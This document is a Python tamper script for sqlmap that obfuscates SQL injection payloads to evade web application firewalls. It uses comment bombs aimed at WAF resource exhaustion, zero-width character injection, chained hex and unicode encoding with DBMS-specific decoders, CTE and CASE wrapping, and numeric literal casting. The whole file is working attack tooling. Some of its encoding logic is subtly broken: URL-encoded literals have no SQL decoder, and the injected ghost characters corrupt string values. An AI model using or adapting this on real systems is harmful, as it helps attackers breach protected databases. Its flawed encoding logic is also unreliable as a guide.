#!/usr/bin/env python
from lib.core.enums import PRIORITY
import random
import re
import string

__priority__ = PRIORITY.HIGH

def dependencies():
    return ["This script thrives with precise DBMS context."]

def tamper(payload, **kwargs):
    if not payload:
        return payload

    dbms = kwargs.get('dbms', None)
    dbms_version = kwargs.get('dbms_version', None)

    def _generate_random_alias(length=random.randint(5, 12)):
        chars = string.ascii_letters + string.digits + "µλπβΣ"
        alias = ''.join(random.choice(chars) for _ in range(length))
        return f"_{alias}_"

    def _inject_ghost_chars(text):
        if not text:
            return text
        result = []
        for char in text:
            result.append(char)
            if random.random() < 0.3:
                result.append(random.choice(['\u200b', '\u200c', '\u200d']))
        return ''.join(result)

    def _dynamic_encoding_chain_with_decoder(text_to_encode, current_dbms):
        """
        Applies a random chain of encoding methods and returns the encoded string
        wrapped with its SQL decoding function for the specific DBMS.
        The decoders are applied in reverse order of encoding for proper unwrapping by SQL.
        """
        if not text_to_encode:
            return "''" # Return empty string literal if input is empty

        available_encoding_schemes = []

        # URL encoding (no direct SQL decode, assumed by context or ignored by WAF)
        # This acts as the innermost literal that other SQL functions wrap.
        available_encoding_schemes.append((
            lambda text_val: ''.join(f'%{ord(c):02x}' for c in text_val),
            lambda sql_expr: sql_expr # Identity for URL, it's the raw literal itself without SQL function wrapper
        ))

        # Hex encoding with DBMS-specific UNHEX/CONVERT
        if current_dbms and 'mysql' in current_dbms.lower():
            available_encoding_schemes.append((
                lambda text_val: text_val.encode('utf-8').hex().upper(),
                lambda sql_expr: f"UNHEX({sql_expr})" # UNHEX wraps the hex literal
            ))
            # MySQL can often handle 0x... directly as string literal, minimal obfuscation but valid
            available_encoding_schemes.append((
                lambda text_val: ''.join(f'0x{ord(c):02x}' for c in text_val),
                lambda sql_expr: sql_expr 
            ))
        elif current_dbms and ('postgresql' in current_dbms.lower() or 'oracle' in current_dbms.lower()):
            # For PostgreSQL, Oracle, HEX needs explicit conversion
            available_encoding_schemes.append((
                lambda text_val: text_val.encode('utf-8').hex().upper(),
                # Note: For DECODE to work, the hex string should ideally not have quotes around it
                # when passed as the *first* argument. The REPLACE is a workaround if the `sql_expr`
                # already carries quotes from being the innermost literal representation.
                lambda sql_expr: f"DECODE(REPLACE({sql_expr}, '''', ''), 'hex')" 
            ))
        
        # Unicode escape (PostgreSQL U& syntax, less portable for others)
        if current_dbms and 'postgresql' in current_dbms.lower():
            available_encoding_schemes.append((
                lambda text_val: ''.join(f'\\{ord(c):04x}' for c in text_val),
                lambda sql_expr: f"U&{sql_expr}" # U& wraps the unicode escaped literal like U&'\0061\0064\006D\0069\006E'
            ))
        
        # Fallback if no specific DBMS encoding schemes are available, though URL encoding is always present
        if not available_encoding_schemes:
             return f"'{''.join(f'%{ord(c):02x}' for c in text_to_encode)}'" # Fallback to just URL encode wrapped in single quotes

        # Choose 1 to 2 random distinct encoding methods to chain
        chain_length = random.randint(1, min(len(available_encoding_schemes), 2))
        selected_encoding_pairs = random.sample(available_encoding_schemes, chain_length)

        current_encoded_string_value = text_to_encode
        applied_decoder_wrappers = []

        # Apply encoders and collect corresponding decoder wrappers
        for encoder_func, decoder_wrap_func in selected_encoding_pairs:
            current_encoded_string_value = encoder_func(current_encoded_string_value)
            applied_decoder_wrappers.append(decoder_wrap_func)

        # Start with the innermost literal representation (e.g., 'encodedhexvalue' or '%41%42')
        final_sql_expression = f"'{current_encoded_string_value}'"

        # Apply decoder wrappers in reverse order to build the nested SQL function calls
        for decoder_wrap_func in reversed(applied_decoder_wrappers):
            final_sql_expression = decoder_wrap_func(final_sql_expression)

        return final_sql_expression

    def _wrap_in_case_true(sql_segment):
        # Safer ELSE clause that doesn't rely on information_schema or specific syntax
        return f"(CASE WHEN 1=1 THEN ({sql_segment}) ELSE (SELECT NULL) END)"

    def _wrap_in_cte(sql_segment):
        if dbms and (
            'mysql' in dbms.lower() and (dbms_version is None or int(dbms_version.split('.')[0]) >= 8) or
            'postgresql' in dbms.lower() or
            'mssql' in dbms.lower() and (dbms_version is None or int(dbms_version.split('.')[0]) >= 12) or # MSSQL 2012+ for full CTE support
            'oracle' in dbms.lower()
        ):
            cte_name = _generate_random_alias()
            alias_name = _generate_random_alias()
            return f"WITH {cte_name} AS (SELECT {sql_segment} AS {alias_name}) SELECT {alias_name} FROM {cte_name}"
        else:
            return sql_segment # Return original if CTE not supported or old version

    def _inject_comment_bomb():
        junk_content = ''.join(random.choice(string.ascii_letters + string.digits + "[]{}!@#$%^&*()_+") for _ in range(random.randint(50, 200)))
        if dbms and 'mysql' in dbms.lower():
            # MySQL versioned comment for WAF resource exhaustion and bypass
            return f"/*! {random.randint(10000, 99999)} {junk_content} */" 
        else:
            return f"/* {junk_content} */" # Standard SQL comment for others, ensuring validity

    original_payload = payload
    processed_payload = original_payload

    # Step 1: Aggressive Keyword Polymorphism (PSR + CDCT)
    # Applying ghost chars *within* keywords is risky for universal "error-free".
    # Instead, we'll embed them in surrounding whitespace and comments, and use other keyword transformations.
    keywords_to_obfuscate = [
        (r'\bSELECT\b', "SELECT"), (r'\bFROM\b', "FROM"), (r'\bWHERE\b', "WHERE"),
        (r'\bAND\b', "AND"), (r'\bOR\b', "OR"), (r'\bUNION\b', "UNION"),
        (r'\bORDER BY\b', "ORDER BY"), (r'\bGROUP BY\b', "GROUP BY"),
        (r'\bHAVING\b', "HAVING"), (r'\bINSERT\b', "INSERT"), (r'\bUPDATE\b', "UPDATE"),
        (r'\bDELETE\b', "DELETE"), (r'\bCREATE\b', "CREATE"), (r'\bALTER\b', "ALTER"),
        (r'\bDROP\b', "DROP"), (r'\bTRUNCATE\b', "TRUNCATE")
    ]
    
    for pattern, keyword_clean in keywords_to_obfuscate:
        processed_payload = re.sub(pattern, lambda m: 
            (random.choice([' ', '\t', '\n']) * random.randint(1,2)) +
            _inject_comment_bomb() +
            (random.choice([' ', '\t', '\n']) * random.randint(1,2)) +
            keyword_clean.upper() + # Keep the actual keyword clean
            (random.choice([' ', '\t', '\n']) * random.randint(1,2)) +
            _inject_comment_bomb() +
            (random.choice([' ', '\t', '\n']) * random.randint(1,2))
        , processed_payload, flags=re.IGNORECASE)

    # Step 2: Recursive Subquery/CTE Wrapping
    # Randomly apply one or both, allowing nesting
    if random.random() < 0.4: # 40% chance to wrap in CTE
        processed_payload = _wrap_in_cte(processed_payload)
    if random.random() < 0.3: # 30% chance to wrap in CASE, applied after CTE if CTE was applied
        processed_payload = _wrap_in_case_true(processed_payload)

    # Step 3: String Literal Obfuscation (CDCT)
    def string_literal_replacer(match):
        original_content = match.group(1)
        # Inject ghost characters into the original string content
        ghosted_content = _inject_ghost_chars(original_content)
        # Apply dynamic encoding with DBMS-specific decoder wrapper
        encoded_and_wrapped = _dynamic_encoding_chain_with_decoder(ghosted_content, dbms)
        return encoded_and_wrapped

    processed_payload = re.sub(r"'((?:[^'\\]|\\.)*)'", string_literal_replacer, processed_payload)

    # Step 4: Numeric Literal Obfuscation (CDCT - now with DBMS-aware logic)
    def numeric_literal_replacer(match):
        num_str = match.group(1)
        if dbms and 'mysql' in dbms.lower():
            # More aggressive MySQL-specific obfuscation
            return f"CAST(0x{int(num_str):x} AS UNSIGNED)"
        else:
            # Safer, more universal obfuscation for other DBMS
            return f"CAST('{num_str}' AS INT)" # Or use +0 (e.g. ({num_str} + 0)) if CAST is too simple

    processed_payload = re.sub(r'\b(\d+)\b', numeric_literal_replacer, processed_payload)

    # No Step 5: Double-quoted identifiers are left untouched to prevent SQL errors,
    # as per our analysis, messing with them leads to syntax breaks in most DBMS.

    # Optional final random whitespace/comment injection if desired, for an extra layer
    if random.random() < 0.2:
        processed_payload = _inject_comment_bomb() + processed_payload + _inject_comment_bomb()

    return processed_payload

